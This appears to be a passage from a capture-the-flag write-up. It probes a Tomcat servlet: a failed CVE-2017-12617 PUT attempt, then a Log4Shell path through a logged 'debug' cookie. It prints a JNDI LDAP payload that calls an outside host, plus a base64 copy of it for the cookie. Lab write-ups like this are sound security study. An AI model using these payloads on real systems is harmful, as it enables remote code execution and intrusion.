<h3>Apache Tomcat</h3>

<p>The Tomcat servers version might be vulnerable to Remote Code Execution via a malicious <code>PUT</code> of a JSP (https://nvd.nist.gov/vuln/detail/CVE-2017-12617).</p>

<p>I tried it but the server is not vulnerable and forbids  <code>PUT</code> requests.</p>

<h2>Code Review</h2>

<p>The Java Servlet has <code>log4j</code> 2.14.1 as a dependency, which is vulnerable to Remote Code Execution via JNDI (Java Naming and Directory Interface).</p>

<p>Looking at the code, <code>ProfileServlet.java</code> logs the content of a <code>debug</code> Cookie value. This can be used to perform a log4shell attack. However, this is only possible if the user is logged in.</p>

<p>JNDI payload:
<code>Payload - ${jndi:ldap://172.17.0.1:2022/foo}</code></p>

<p>base64 encoded (for Cookie):
<code>VGVzdCAtICR7am5kaTpsZGFwOi8vMTcyLjE3LjAuMToyMDIyL2Zvb30</code></p>

<p>In the Docker environment, the username and password are set to an empty string. However, this is not the case in production, maybe username or password are the flag. The user is identified by a SHA256 hash which is <code>SHA256(username + password)</code>.  The Database credentials don't work.</p>

<p>Tomcat does not use log4j so it is not vulnerable to malicious user input. Other libraries also don't use log4j.</p>
